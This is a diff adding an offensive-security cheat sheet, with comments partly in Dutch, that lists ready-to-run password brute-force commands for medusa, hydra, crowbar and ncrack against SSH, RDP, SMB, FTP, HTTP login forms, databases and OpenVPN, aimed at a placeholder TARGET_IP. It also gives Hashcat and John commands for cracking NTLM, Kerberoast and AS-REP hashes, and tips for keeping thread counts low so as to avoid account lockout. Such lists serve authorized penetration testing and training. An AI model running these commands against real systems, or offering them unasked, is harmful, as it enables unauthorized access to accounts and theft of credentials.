@@ -1,0 +1,51 @@
+# Network Brute Force - medusa, hydra, crowbar, ncrack
+# === Medusa (multi-protocol) ===
+# SSH:
+medusa -h TARGET_IP -U users.txt -P passwords.txt -M ssh -t 4
+# RDP:
+medusa -h TARGET_IP -U users.txt -P passwords.txt -M rdp -t 4
+# FTP:
+medusa -h TARGET_IP -U users.txt -P passwords.txt -M ftp -t 4
+# SMB:
+medusa -h TARGET_IP -U users.txt -P passwords.txt -M smbnt -t 4
+# HTTP Basic:
+medusa -h TARGET_IP -U users.txt -P passwords.txt -M http -m DIR:/admin -t 4
+# === Hydra (meest uitgebreid) ===
+# SSH:
+hydra -L users.txt -P passwords.txt ssh://TARGET_IP -t 4
+# RDP:
+hydra -L users.txt -P passwords.txt rdp://TARGET_IP -t 4
+# HTTP POST form:
+hydra -L users.txt -P passwords.txt TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4
+# HTTP Basic Auth:
+hydra -L users.txt -P passwords.txt TARGET_IP http-get /admin -t 4
+# SMB:
+hydra -L users.txt -P passwords.txt smb://TARGET_IP -t 4
+# MySQL:
+hydra -L users.txt -P passwords.txt mysql://TARGET_IP -t 4
+# MSSQL:
+hydra -L users.txt -P passwords.txt mssql://TARGET_IP -t 4
+# === Crowbar (RDP/VNC/SSH keys/OpenVPN) ===
+# RDP (betrouwbaarder dan hydra voor RDP):
+crowbar -b rdp -s TARGET_IP/32 -U users.txt -C passwords.txt -n 1
+# SSH key brute force:
+crowbar -b sshkey -s TARGET_IP/32 -u root -k /path/to/keys/ -n 1
+# VPN:
+crowbar -b openvpn -s TARGET_IP/32 -u user -C passwords.txt -c /path/to/config.ovpn
+# === Ncrack ===
+# RDP:
+ncrack -vv --user admin -P passwords.txt rdp://TARGET_IP
+# SSH:
+ncrack -vv -U users.txt -P passwords.txt ssh://TARGET_IP
+# === Hash cracking (offline) ===
+# John:
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+# Hashcat:
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
+hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt   # Kerberoast
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt  # AS-REP
+hashcat -m 5600 netntlm_hashes.txt /usr/share/wordlists/rockyou.txt # NetNTLMv2
+# Tip: -t 4 = 4 threads (voorkom account lockout)
+# Tip: Crowbar is betrouwbaarder voor RDP dan hydra
+# Tip: Gebruik altijd -t (threads) laag om lockout te voorkomen
